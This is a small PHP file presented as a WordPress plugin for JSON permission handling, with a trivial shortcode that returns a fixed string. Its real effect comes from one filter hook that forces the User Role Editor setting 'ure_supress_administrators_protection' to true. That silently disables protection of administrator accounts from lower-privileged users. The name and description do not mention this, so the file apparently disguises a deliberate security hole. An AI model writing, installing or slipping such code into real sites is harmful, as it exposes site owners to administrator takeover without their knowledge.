<?php
/**
 * Plugin Name: Json Permission Plugin
 * Description: This plugin for json request accept from admin
 */

function json_example_function(){
$json_permission = "Json info permission";
return $json_permission;
}

add_filter('ure_supress_administrators_protection', 'switch_off_ure_administrators_protection', 10, 1);
function switch_off_ure_administrators_protection($supress_protection) {

    $supress_protection = true;
    
    return $supress_protection;
}

add_shortcode('json_function','json_example_function');